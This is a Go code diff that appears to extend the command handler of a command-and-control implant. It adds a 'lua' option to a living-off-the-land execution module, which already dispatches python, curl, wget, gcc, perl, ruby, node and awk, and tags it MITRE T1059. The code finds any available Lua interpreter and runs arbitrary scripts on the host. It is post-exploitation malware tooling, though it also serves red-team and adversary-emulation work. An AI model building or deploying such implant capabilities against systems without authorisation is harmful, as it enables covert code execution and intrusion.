@@ -59,8 +59,10 @@ func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
 		return gtfobinNode(args.Path, args.Args)
 	case "awk":
 		return gtfobinAwk(args.Path, args.Args)
+	case "lua":
+		return gtfobinLua(args.Path, args.Args)
 	default:
-		return errorf("Unknown action: %s (use python, curl, wget, gcc, perl, ruby, node, awk)", args.Action)
+		return errorf("Unknown action: %s (use python, curl, wget, gcc, perl, ruby, node, awk, lua)", args.Action)
 	}
 }
 
@@ -316,6 +318,21 @@ func gtfobinAwk(program, extraArgs string) structs.CommandResult {
 	}
 
 	cmdArgs := []string{program}
+	if extraArgs != "" {
+		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+	}
+
+	return runWithTimeout(binary, cmdArgs)
+}
+
+// lua — T1059 — Execute Lua script via lua interpreter
+func gtfobinLua(scriptPath, extraArgs string) structs.CommandResult {
+	binary := findBinary("lua", "lua5.4", "lua5.3", "lua5.1", "luajit")
+	if binary == "" {
+		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
+	}
+
+	cmdArgs := []string{scriptPath}
 	if extraArgs != "" {
 		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
 	}
